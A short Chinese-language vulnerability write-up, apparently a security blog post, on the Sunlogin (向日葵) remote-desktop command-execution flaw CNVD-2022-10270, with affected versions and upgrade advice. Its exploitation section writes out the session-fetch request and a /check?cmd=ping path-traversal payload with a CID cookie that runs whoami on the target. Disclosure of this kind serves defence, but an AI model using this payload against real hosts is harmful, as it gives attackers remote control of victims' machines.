# 向日葵RCE（CNVD-2022-10270）

![image-20220217103539107](https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220217103539107.png)



# 漏洞描述

​	向日葵是一款免费的，集远程控制电脑手机、远程桌面连接、远程开机、远程管理、支持内网穿透的一体化远程控制管理工具软件。

​	上海贝锐信息科技股份有限公司向日葵个人版for Windows存在命令执行漏洞，攻击者可利用该漏洞获取服务器控制权。



# 漏洞等级

严重



# 漏洞利用

向日葵在启动时会随机启动一个4W+的高位端口这个可以在启动日志中找到高位端口的位置

![](https://gitee.com/greetdawn/blogImages/raw/master/img/Image.png)

这里漏洞主要在ckeck接口中存在ping命令拼接所致先通过接口获取session id /cgi-bin/rpc?action=verify-haras

![Image](https://gitee.com/greetdawn/blogImages/raw/master/img/202202171041514.png)

利用check接口拼接payload /check?cmd=ping../../../../../../../../../../../windows/system32/whoamiheader头插入cookie: CID=CLx1PDE6V7X7MyHftDYGnC0MyXCtqSYh

![Image](https://gitee.com/greetdawn/blogImages/raw/master/img/202202171041613.png)



# 漏洞版本

可能存在如下版本，但不限于

SunloginClient_11.0.0.33162_X64

SunloginClient_11.0.0.33162_X64

SunloginClient_11.1.1_X64



# 修复建议

请尽快在官网进行其版本升级

厂商已发布了漏洞修复程序，请及时关注更新：

https://sunlogin.oray.com/